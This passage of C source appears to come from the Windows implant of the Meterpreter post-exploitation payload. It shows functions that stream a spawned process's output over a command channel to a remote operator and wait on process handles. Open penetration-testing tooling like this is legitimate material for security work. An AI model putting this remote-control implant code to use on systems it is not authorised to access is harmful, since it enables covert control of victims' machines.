			// sf: if no data is available on the pipe we sleep to avoid running a tight loop
			// in this thread, as anonymous pipes won't block for data to arrive.
			met_api->win_api.kernel32.Sleep(100);
		}
	}
	else
	{
		result = met_api->win_api.kernel32.GetLastError();
	}

	if (result != ERROR_SUCCESS)
	{
		dprintf("Closing down channel: result: %d\n", result);
		process_channel_close(channel, NULL, ctx);
		met_api->channel.close(channel, remote, NULL, 0, NULL);
	}

	dprintf("[PROCESS] process_channel_interact_notify: END");
	return result;
}

/*
 * Enables or disables interactivity with the standard output handle on the channel
 */
DWORD process_channel_interact(Channel* channel, Packet* request, LPVOID context, BOOLEAN interact)
{
	ProcessChannelContext* ctx = (ProcessChannelContext*)context;
	DWORD result = ERROR_SUCCESS;

	dprintf("[PROCESS] process_channel_interact. channel=0x%08X, ctx=0x%08X, interact=%d", channel, ctx, interact);

	if (!met_api->channel.exists(channel) || ctx == NULL)
	{
		dprintf("[PROCESS] process_channel_interact: Channel doesn't exist or context is NULL");
		return result;
	}

	// If the remote side wants to interact with us, schedule the stdout handle
	// as a waitable item
	if (interact)
	{
		// try to resume it first, if it's not there, we can create a new entry
		if ((result = met_api->scheduler.signal_waitable(ctx->pStdout, SchedulerResume)) == ERROR_NOT_FOUND)
		{
			result = met_api->scheduler.insert_waitable(ctx->pStdout, channel, context,
				(WaitableNotifyRoutine)process_channel_interact_notify,
				(WaitableDestroyRoutine)process_channel_interact_destroy);
		}
	}
	else
	{
		// Otherwise, pause it
		result = met_api->scheduler.signal_waitable(ctx->pStdout, SchedulerPause);
	}
	dprintf("[PROCESS] process_channel_interact: done");
	return result;
}

/*
 * Wait on a process handle until it terminates.
 *
 * req: TLV_TYPE_HANDLE - The process handle to wait on.
 */
DWORD request_sys_process_wait(Remote *remote, Packet *packet)
{
	Packet * response = met_api->packet.create_response( packet );
	HANDLE handle     = NULL;
	DWORD result      = ERROR_INVALID_PARAMETER;

	handle = (HANDLE)met_api->packet.get_tlv_value_qword( packet, TLV_TYPE_HANDLE );

	if( handle )
	{
		if( met_api->win_api.kernel32.WaitForSingleObject( handle, INFINITE ) == WAIT_OBJECT_0 )
			result = ERROR_SUCCESS;
	}

	met_api->packet.transmit_response( result, remote, response );

	return result;
}
